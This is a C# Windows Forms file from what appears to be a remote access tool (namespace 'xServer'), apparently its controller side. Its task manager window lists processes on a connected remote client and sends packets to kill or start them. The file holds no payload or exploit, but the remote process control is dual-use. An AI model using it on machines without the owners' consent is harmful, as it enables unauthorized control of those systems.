using System;
using System.Windows.Forms;
using xServer.Controls;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmTaskManager : Form
    {
        private readonly Client _connectClient;

        public FrmTaskManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmTm = this;

            InitializeComponent();
        }

        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            this.lstTasks.LvwColumnSorter.NeedNumberCompare = (e.Column == 1);
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.lstTasks.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.lstTasks_ColumnClick);

                this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
            }
        }


        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmTm = null;
        }

        #region "ContextMenuStrip"

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                foreach (ListViewItem lvi in lstTasks.SelectedItems)
                {
                    new Core.Packets.ServerPackets.DoProcessKill(int.Parse(lvi.SubItems[1].Text)).Execute(_connectClient);
                }
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processname = string.Empty;
            if (InputBox.Show("Processname", "Enter Processname:", ref processname) == DialogResult.OK)
            {
                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoProcessStart(processname).Execute(_connectClient);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
            }
        }

        #endregion

        public void ClearListviewItems()
        {
            try
            {
                lstTasks.Invoke((MethodInvoker)delegate
                {
                    lstTasks.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddProcessToListview(string processName, int pid, string windowTitle)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    processName, pid.ToString(), windowTitle
                });

                lstTasks.Invoke((MethodInvoker)delegate
                {
                    lstTasks.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void SetProcessesCount(int processesCount)
        {
            try
            {
                statusStrip.Invoke((MethodInvoker) delegate
                {
                    processesToolStripStatusLabel.Text = "Processes: " + processesCount.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}